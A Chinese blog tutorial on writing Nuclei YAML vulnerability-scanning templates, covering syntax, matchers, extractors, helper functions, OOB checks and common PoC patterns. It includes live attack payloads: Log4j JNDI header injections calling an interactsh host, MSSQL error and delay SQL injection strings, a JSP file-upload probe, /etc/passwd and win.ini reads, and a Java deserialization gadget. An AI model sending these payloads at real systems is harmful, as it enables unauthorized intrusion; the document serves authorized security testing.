---
title: "认识Nuclei Yaml模板"
date: 2024-05-29T08:45:59+08:00
draft: false
categories:
- 学习记录
tags:
- nuclei
---

# 基本语法

1. **大小写敏感**：YAML对大小写敏感，这意味着键名的大小写必须精确匹配。
2. **使用缩进表示层级关系**：YAML通过缩进来表示数据的层级结构。缩进时不允许使用Tab键，只允许使用空格键。**缩进的空格数目不重要，只要相同层级的元素左侧对齐即可**。
3. **注释**：使用`#`符号表示注释，从`#`字符开始到行尾的内容都会被解析器忽略。
4. **数据类型**：YAML支持的数据类型包括对象（键值对的集合）、数组（一组按次序排列的值）、纯量（单个的、不可再分的值，如字符串、布尔值、整数、浮点数等）。
5. **变量使用**：YAML提供了锚点（&）和引用（*）的语法，用于复用数据，避免重复定义。
6. **复合结构**：对象和数组可以结合使用，形成复合结构，如在一个YAML文件中定义多个对象或数组。

# 模板格式

```yaml
id: 
info:
  name: 
  author: 
  severity: 
  description: 

http:
  - raw:
      - |
        HTTP请求体

    筛选与匹配
```

1. **id**：id不能有中文、特殊字符、--以及空格等内容，id这个参数，您可以理解为是输出的标题，一个简单易懂的ID，可以让您更快的判断出，该漏洞的大致情况：

2. **info**：信息块，名称 、 作者 、 严重性 、 描述 、参考和 标签 ，这些都属于信息块的范围，一般情况下，我们只需要写入名称、作者、严重性、描述、标签这几项即可；

3. **name**：模板名称，这个建议跟id相同即可；

4. **author**：作者名称，标识版权的一种方式，但是加不加也就那样，毕竟下载后随时可以更改，也保护不了啥。

5. **severity**：严重性，这里不可以使用中文，一般用critical、hight、Medium、info来表示威胁等级；

6. **description**：漏洞介绍，这里可以使用中文，也不限制特殊字符，一般是用来做漏洞介绍用的，可以方便使用者了解该漏洞的具体说明；

7. **tags**：标签，是为了给漏洞加一个标签，方便进行统一扫描，例如：tags: seeyon(切记不要用中文哈)

**在语法错误后，nuclei执行时会提示“Could not run nuclei: no templates provided for scan”，当看到该提示时，记得先排查下模板id是否存在特殊字符；**

# nuclei模板内置保留字

```
{{Hostname}}：这是一个常用的保留字，表示主机名。
{{randstr}}：这是一个随机字符串。
{{rand_int(1,9999)}}：这是一个生成 1 到 9999 之间随机整数的保留字。
{{BaseURL}}：表示完整的基本 URL，例如 https://example.com:443/foo/bar.php。
{{RootURL}}：表示不包含路径和文件的基本 URL，例如 https://example.com:443。
{{Host}}：表示主机名，例如 example.com。
{{Port}}：表示端口号，例如 443。
{{Path}}：表示路径，例如 /seeyon/login。
{{File}}：表示文件名，例如 bar.php。
{{Scheme}}：表示协议，例如 https。
{{hex_decode("")}}：这是一个十六进制解码的保留字。
md5()：这是一个 MD5 转换的保留字。
```

# 匹配器——matchers

## 匹配器类型

```
1、size：判断返回包大小 
2、word ：关键词匹配
3、regex ：正则表达式
4、binary ：要为十六进制响应匹配二进制
5、dsl：匹配协议响应
6、status：匹配状态码
7、xpath
```
例如：

```yaml
#检查响应的大小是否大于1000字节
matchers:
  - type: size
  	size: 
  	  - ">1000"

#匹配包含 “error” 关键词的响应
matchers:
  - type: word
  	word: 
  	  - "error"
 
#匹配响应中的版本号：
matchers:
  - type: regex
  	regex: 
  	  - "Version: (\\d+\\.\\d+\\.\\d+)"
  
#十六进制响应匹配二进制：
matchers:
  - type: binary
    binary:
      - "504B0304" # zip archive
      - "526172211A070100" # RAR archive version 5.0
      - "FD377A585A0000" # xz tar.xz archive
    condition: or
    part: body

#匹配 HTTP 响应码为 200 的情况：
matchers:
  - type: dsl
  	dsl: 
  	  - "response_code == 200"
 
 #匹配响应持续时间
 matchers:
  - type: dsl
  	dsl: 
  	  - "duration >= 4"
```

## 匹配条件

往往为了降低误报率会使用多个匹配内容，此时就要用到`condition`和`matchers-condition`。例如：

```yaml
#使用单个匹配器的情况：
matchers:
  - type: word
  	condition: or
  	word: 
  	  - "error"
  	  - "Version"

#使用多个匹配器的情况：
matchers-condition: and
  matchers:
    - type: word
      words:
        - "X-Powered-By: PHP"
        - "PHPSESSID"
      condition: or
      part: header
    - type: word
      words:
        - "PHP"
      part: body
```

## dsl匹配器

复杂的匹配器类型dsl允许使用辅助函数构建更精细的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。

```yaml
matchers:
  - type: dsl
    dsl:
      - "len(body)<1024 && status_code==200" # Body length less than 1024 and 200 status code
      - "contains(toupper(body), md5(cookie))" # Check if the MD5 sum of cookies is contained in the uppercase body
```

协议响应的每个部分都可以与DSL匹配器匹配，例如：

| Response Part  | Description                                     | Example                |
| -------------- | ----------------------------------------------- | ---------------------- |
| content_length | Content-Length Header                           | content_length >= 1024 |
| status_code    | Response Status Code                            | status_code==200       |
| all_headers    | Unique string containing all headers            | len(all_headers)       |
| body           | Body as string                                  | len(body)              |
| header_name    | Lowercase header name with `-` converted to `_` | len(user_agent)        |
| raw            | Headers + Response                              | len(raw)               |

有时候使用dsl匹配器未必一定要使用`condition`，例如：

```yaml
matchers:
  - type: dsl
    dsl:
      - "len(body)<1024 && status_code==200 && contains(body,"OK")"
```

dsl有两个比较常用的辅助函数：

```
# 同时匹配响应体中多个关键字
contains_all(body,"[PHP]","php.ini")

# 匹配响应体中单个关键字
contains(body,"[PHP]")

# 匹配OOB dns响应
contains(interactsh_protocol,"dns")
```

## 负匹配器

顾名思义，负匹配器与匹配器效果相反，当要否定某个匹配或者说排除某个匹配项时负匹配器非常有用，可以通过添加matchers块`negative: true`来使用。

例如，要匹配返回`PHPSESSID`响应标头中没有的所有 URL：

```yaml
matchers:
  - type: word
    words:
      - "PHPSESSID"
    part: header
    negative: true
```

# 提取器————extractors

## 正则表达式提取器

正则表达式提取器，通过该方法，将正则表达式匹配到的内容，提取到指定变量中去使用。

在下面的示例中，如果响应中包含类似 “Version: 1.2.3” 的文本，它将提取版本号并存储在名为 version 的变量中。

```yaml
extractors:
  - regex:
      pattern: "Version: (\\d+\\.\\d+\\.\\d+)"
      target: version
```

## JSON提取器

用于从 JSON 块中提取对象的值，同时该提取器也支持赋值。

在下面的示例中，如果 JSON 响应包含一个名为 user 的对象，其中有一个名为 name 的属性，它将提取该属性的值并存储在名为 username 的变量中。

```yaml
extractors:
  - json:
      path: .user.name
      target: username
```

## Xpath提取器

从 HTML 响应中提取属性值的xpath提取器。

在下面的示例中，如果 HTML 响应包含一个 `<img>` 标签，它将提取 src 属性的值并存储在名为 image_url 的变量中

```yaml
extractors:
  - xpath:
      expression: //img/@src
      target: image_url
```

## Kval提取器

从 HTTP 响应中提取标头的内容。

下面示例是提取响应头中`content-type`内容

```
extractors:
      - type: kval  # type of the extractor
        kval:
          - content_type  # header/cookie value to extract from response
```

请注意，`content-type`已替换为，`content_type`因为Kval提取器不接受破折号 ( `-`) 作为输入，必须替换为下划线 ( `_`)。

## DSL提取器

下面示例是通过dsl辅助函数`len`提取响应体的长度

```
extractors:
      - type: dsl  # type of the extractor
        dsl:
          - "len(body)"  # dsl expression value to extract from response
```

## 动态提取器

在编写多请求模板时，提取器可用于在运行时捕获动态值。CSRF Tokens、Session Headers 等可以被提取并在请求中使用。此功能仅适用于 RAW 请求格式。

使用名称定义动态提取器的示例，该提取器`api`将从请求中捕获基于正则表达式的模式。

```yaml
extractors:
  - type: regex
    name: api
    part: body
    internal: true # Required for using dynamic variables
    regex:
      - "(?m)[0-9]{3,10}\.[0-9]+"
```

提取的值存储在变量 **api** 中，可以在后续请求的任何部分中使用。

如果要将提取器用作动态变量，则必须使用`internal: true`以避免在终端中打印提取的值。

还可以为正则表达式指定可选的正则表达式 **匹配组以进行更复杂的匹配。**

```yaml
extractors:
  - type: regex  # type of extractor
    name: csrf_token # defining the variable name
    part: body # part of response to look for
    # group defines the matching group being used. 
    # In GO the "match" is the full array of all matches and submatches 
    # match[0] is the full match
    # match[n] is the submatches. Most often we'd want match[1] as depicted below
    group: 1
    regex:
      - '<inputsname="csrf_token"stype="hidden"svalue="([[:alnum:]]{16})"s/>'
```

上面带有名称的提取器`csrf_token`将保存由`([[:alnum:]]{16})`as提取的值`abcdefgh12345678`。

如果此正则表达式未提供组选项，则上述名称提取器`csrf_html_tag`将完整匹配（by `<input name="csrf_token"stype="hidden"svalue="([[:alnum:]]{16})" />`）作为`<input name="csrf_token" type="hidden" value="abcdefgh12345678" />`.

# 变量

## 变量的定义与使用

变量可用于声明一些在整个模板中保持不变的值。变量的值一旦计算就不会改变。变量可以是简单的字符串或 DSL 辅助函数。如果变量是辅助函数，则用双花括号括起来`{{expression}}`。变量在模板级别声明，目前，dns、http、headless和网络协议支持变量。一般使用`variables`来定义变量，例如：

```yaml
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /temp/upload?groupid=aa&fileType=jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
        Content-type: multipart/form-data; boundary=----------{{boundary}}
        
        ------------{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="{{filename}}.jsp"
        Content-Type: application/octet-stream
        
        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------------{{boundary}}--
  - raw:
      - |
        GET /temp/static/pages/aa/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains(body_2,'12321')"
```

上面使用辅助函数定义了两个变量filename和boundary，在整个请求过程中变量的值不会改变

## 攻击载荷

payloads定义与变量相同，payloads 用来提供攻击载荷的部分，格式：

```
payloads:    
  变量名: 变量内容
```

如log4j扫描模板：

```yaml
requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        {{log4j_payloads}}
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        {{log4j_payloads}}
    payloads:
      log4j_payloads:
        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
            
    attack: clusterbomb
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"
```

# 可能会用到的辅助函数

|                                                              |                                                              |                                                              |                                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Helper function                                              | Description                                                  | Example                                                      | Output                                                       |
| base64(src interface{}) string                               | Base64 对字符串进行编码                                      | `base64("Hello")`                                            | `SGVsbG8=`                                                   |
| base64_decode(src interface{}) []byte                        | Base64 对字符串进行解码                                      | `base64_decode("SGVsbG8=")`                                  | `Hello`                                                      |
| base64_py(src interface{}) string                            | 像 python 一样将字符串编码为 base64（带有新行）              | `base64_py("Hello")`                                         | `SGVsbG8=`                                                   |
| concat(arguments …interface{}) string                        | 连接给定数量的参数以形成一个字符串                           | `concat("Hello", 123, "world)`                               | `Hello123world`                                              |
| compare_versions(versionToCheck string, constraints …string) bool | 将第一个版本参数与提供的约束进行比较                         | `compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`           | `true`                                                       |
| contains(input, substring interface{}) bool                  | 验证字符串是否包含子字符串                                   | `contains("Hello", "lo")`                                    | `true`                                                       |
| generate_java_gadget(gadget, cmd, encoding interface{}) string | 生成 Java 反序列化小工具                                     | `generate_java_gadget("dns", "{{interactsh-url}}", "base64")` | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54` |
| gzip(input string) string                                    | 使用 GZip 压缩输入                                           | `gzip("Hello")`                                              |                                                              |
| gzip_decode(input string) string                             | 使用 GZip 解压缩输入                                         | `gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))` | `Hello`                                                      |
| zlib(input string) string                                    | 使用 Zlib 压缩输入                                           | `base64(zlib("Hello"))`                                      | `eJzySM3JyQcEAAD//wWMAfU=`                                   |
| zlib_decode(input string) string                             | 使用 Zlib 解压缩输入                                         | `zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))` | `Hello`                                                      |
| hex_decode(input interface{}) []byte                         | 十六进制解码给定的输入                                       | `hex_decode("6161")`                                         | `aa`                                                         |
| hex_encode(input interface{}) string                         | 十六进制编码给定的输入                                       | `hex_encode("aa")`                                           | `6161`                                                       |
| html_escape(input interface{}) string                        | HTML 转义给定的输入                                          | `html_escape("<body>test</body>")`                           | `<body>test</body>`                                          |
| html_unescape(input interface{}) string                      | HTML 取消转义给定的输入                                      | `html_unescape("<body>test</body>")`                         | `<body>test</body>`                                          |
| len(arg interface{}) int                                     | 返回输入的长度                                               | `len("Hello")`                                               | `5`                                                          |
| md5(input interface{}) string                                | 计算输入的 MD5（消息摘要）哈希                               | `md5("Hello")`                                               | `8b1a9953c4611296a827abf8c47804d7`                           |
| mmh3(input interface{}) string                               | 计算输入的 MMH3 (MurmurHash3) 哈希                           | `mmh3("Hello")`                                              | `316307400`                                                  |
| print_debug(args …interface{})                               | 打印给定输入或表达式的值。用于调试。                         | `print_debug(1+2, "Hello")`                                  | `3 Hello`                                                    |
| rand_base(length uint, optionalCharSet string) string        | 从可选字符集生成给定长度字符串的随机序列（默认为字母和数字） | `rand_base(5, "abc")`                                        | `caccb`                                                      |
| rand_char(optionalCharSet string) string                     | 从可选字符集中生成随机字符（默认为字母和数字）               | `rand_char("abc")`                                           | `a`                                                          |
| rand_int(optionalMin, optionalMax uint) int                  | 在给定的可选限制之间生成一个随机整数（默认为 0 - MaxInt32）  | `rand_int(1, 10)`                                            | `6`                                                          |
| rand_text_alpha(length uint, optionalBadChars string) string | 生成给定长度的随机字母字符串，不包括可选的割集字符           | `rand_text_alpha(10, "abc")`                                 | `WKozhjJWlJ`                                                 |
| rand_text_alphanumeric(length uint, optionalBadChars string) string | 生成一个给定长度的随机字母数字字符串，没有可选的割集字符     | `rand_text_alphanumeric(10, "ab12")`                         | `NthI0IiY8r`                                                 |
| rand_text_numeric(length uint, optionalBadNumbers string) string | 生成给定长度的随机数字字符串，没有可选的不需要的数字集       | `rand_text_numeric(10, 123)`                                 | `0654087985`                                                 |
| regex(pattern, input string) bool                            | 针对输入字符串测试给定的正则表达式                           | `regex("H([a-z]+)o", "Hello")`                               | `true`                                                       |
| remove_bad_chars(input, cutset interface{}) string           | 从输入中删除所需的字符                                       | `remove_bad_chars("abcd", "bc")`                             | `ad`                                                         |
| repeat(str string, count uint) string                        | 重复输入字符串给定的次数                                     | `repeat("../", 5)`                                           | `../../../../../`                                            |
| replace(str, old, new string) string                         | 替换给定输入中的给定子字符串                                 | `replace("Hello", "He", "Ha")`                               | `Hallo`                                                      |
| replace_regex(source, regex, replacement string) string      | 替换与输入中给定正则表达式匹配的子字符串                     | `replace_regex("He123llo", "(\\d+)", "")`                    | `Hello`                                                      |
| reverse(input string) string                                 | 反转给定的输入                                               | `reverse("abc")`                                             | `cba`                                                        |
| sha1(input interface{}) string                               | 计算输入的 SHA1（安全哈希 1）哈希                            | `sha1("Hello")`                                              | `f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0`                   |
| sha256(input interface{}) string                             | 计算输入的 SHA256（安全哈希 256）哈希                        | `sha256("Hello")`                                            | `185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969` |
| to_lower(input string) string                                | 将输入转换为小写字符                                         | `to_lower("HELLO")`                                          | `hello`                                                      |
| to_upper(input string) string                                | 将输入转换为大写字符                                         | `to_upper("hello")`                                          | `HELLO`                                                      |
| trim(input, cutset string) string                            | 返回一个输入切片，其中包含在 cutset 中的所有前导和尾随 Unicode 代码点都已删除 | `trim("aaaHelloddd", "ad")`                                  | `Hello`                                                      |
| trim_left(input, cutset string) string                       | 返回一个输入切片，其中包含在 cutset 中的所有前导 Unicode 代码点都已删除 | `trim_left("aaaHelloddd", "ad")`                             | `Helloddd`                                                   |
| trim_prefix(input, prefix string) string                     | 返回没有提供的前导前缀字符串的输入                           | `trim_prefix("aaHelloaa", "aa")`                             | `Helloaa`                                                    |
| trim_right(input, cutset string) string                      | 返回一个字符串，其中包含在 cutset 中的所有尾随 Unicode 代码点都已删除 | `trim_right("aaaHelloddd", "ad")`                            | `aaaHello`                                                   |
| trim_space(input string) string                              | 返回一个字符串，删除所有前导和尾随空格，由 Unicode 定义      | `trim_space(" Hello ")`                                      | `"Hello"`                                                    |
| trim_suffix(input, suffix string) string                     | 返回没有提供的尾随后缀字符串的输入                           | `trim_suffix("aaHelloaa", "aa")`                             | `aaHello`                                                    |
| unix_time(optionalSeconds uint) float64                      | 返回当前 Unix 时间（自 1970 年 1 月 1 日 UTC 以来经过的秒数）以及添加的可选秒数 | `unix_time(10)`                                              | `1639568278`                                                 |
| url_decode(input string) string                              | URL 解码输入字符串                                           | `url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`     | `https://projectdiscovery.io?test=1`                         |
| url_encode(input string) string                              | URL 对输入字符串进行编码                                     | `url_encode("https://projectdiscovery.io/test?a=1")`         | `https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1`           |
| wait_for(seconds uint)                                       | 暂停执行给定的秒数                                           | `wait_for(10)`                                               | `true`                                                       |
| join(separator string, elements …interface{}) string)        | 暂停执行给定的秒数                                           | `join("_", 123, "hello", "world")`                           | `123_hello_world`                                            |
| hmac(algorithm, data, secret)                                | hmac 函数，接受带有数据和秘密的散列函数类型                  | `hmac("sha1", "test", "scrt")`                               | `8856b111056d946d5c6c92a21b43c233596623c6`                   |
| date_time(dateTimeFormat)                                    | 以 go 风格的日期时间格式返回日期或时间                       | `date_time("%Y-%M-%D %H:%m")`                                |                                                              |

# OOB测试

Nuclei 支持使用[interact.sh](https://github.com/projectdiscovery/interactsh) API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联。就像`{{interactsh-url}}` 在请求中的任何地方编写一样简单，并为`interact_protocol`. Nuclei 将处理交互与模板的相关性以及它通过允许轻松的 OOB 扫描而生成的请求。

## Interactsh 占位符

`{{interactsh-url}}`**http**和**网络**请求中支持占位符。

`{{interactsh-url}}`下面提供了一个带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。

```yaml
- raw:
    - |
      GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
      Host: {{Hostname}}
```

## Interactsh 匹配器

Interactsh 交互可以与`word`，`regex`或`dsl`使用以下部分的匹配器/提取器一起使用。

|        part         |
| :-----------------: |
| interactsh_protocol |
| interactsh_request  |
| interactsh_response |

### interactsh_protocol

值可以是 dns、http 或 smtp。这是每个基于interactsh的模板的标准匹配器，dns通常是通用值，因为它本质上是非侵入性的。

### interactsh_request

interact.sh 服务器收到的请求。

### interactsh_response

interact.sh 服务器发送给客户端的响应。

Interactsh DNS 交互匹配器示例：

```yaml
matchers:
  - type: word
    part: interactsh_protocol # Confirms the DNS Interaction
    words:
      - "dns"
```

交互内容上的 HTTP 交互匹配器 + 单词匹配器示例

```yaml
matchers-condition: and
matchers:
    - type: word
      part: interactsh_protocol # Confirms the HTTP Interaction
      words:
        - "http"

    - type: regex
      part: interactsh_request # Confirms the retrieval of etc/passwd file
      regex:
        - "root:[x*]:0:0:"
```

# 其他

## stop-at-first-match

一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描

## skip-variables-check

当你的请求内容里包含 `{{` 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.

## 嵌套表达式

```
❌ {{urldecode({{base64_decode('SGVsbG8=')}})}}
✔ {{url_decode(base64_decode('SGVsbG8='))}}
```

---

# 常见写法

写POC应秉承无毒无害的本质，下面总结一些常用写法，其实也可以参考[Xray POC编写模板](https://www.yuque.com/jarciscy/zkonow/kxc58s?)，只是写法有所不同。

## 文件读取

文件读取应考虑windows和linux两种情况

```
/etc/passwd文件：
matchers:
  - type: dsl
    dsl:
      - regex('root:.*?:[0-9]*:[0-9]*:',body) && status_code == 200


win.ini文件：
matchers:
      - type: dsl
        dsl:
          - status_code == 200 && contains(body,"for 16-bit app support")

/apache/php.ini文件：
matchers:
  - type: dsl
    dsl:
      - status_code == 200 && contains_all(body,"[PHP]","php.ini")
```

## SQL注入

### 报错注入

可以通过计算md5进行匹配

```
mssql payload:
'%20and%201%3D(select%20substring(sys.fn_sqlvarbasetostr(HashBytes('MD5'%2C'999999999'))%2C3%2C32))%20--

matchers:
  - type: dsl
    dsl:
      - contains(body,"c8c605999f3d8352d7bb792cf3fdb25b")
```

### 延时注入

延时注入之前设置sleep为5会有很多漏报，设为4后正常

```
payload：');+waitfor+delay+'0:0:4'--

matchers:
  - type: dsl
    dsl:
      - duration>=4 && status_code == 200
```

## 命令执行

命令执行可以通过OOB验证，可以通过读文件验证，也可以通过加减运算进行验证

```
读文件验证：
windows：type c:/windows/win.ini
linux：cat /etc/passwd

加减运算：
windows：set /A {{randstr_1}}-{{randstr_2}}
linux：expr {{randstr_1}} - {{randstr_2}}  或  echo {{randstr_1}}-{{randstr_2}}|bc
```

## 文件上传

- multipart/form-data; boundary=---------------------------16314487820932200903769468567中的boundary应随机化
- 在上传的文件不能删除的情况下，可以选择继续上传一个同名空文件（请确保上传后的文件名称不被重命名），将原来的文件内容进行覆盖。
- 但常规情况下，在上传php，jsp文件时，可以使用一些函数来将上传的文件删除，示例如下：

```
JSP:
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

PHP:
<?php echo "{{randstr}}"; unlink(__FILE__); ?>
```



# 参考文章

https://www.cnblogs.com/haidragon/p/16852363.html

https://mp.weixin.qq.com/s/9n13N28-c_zmaqae2-iAUw

https://blog.csdn.net/qq_41315957/article/details/126594670
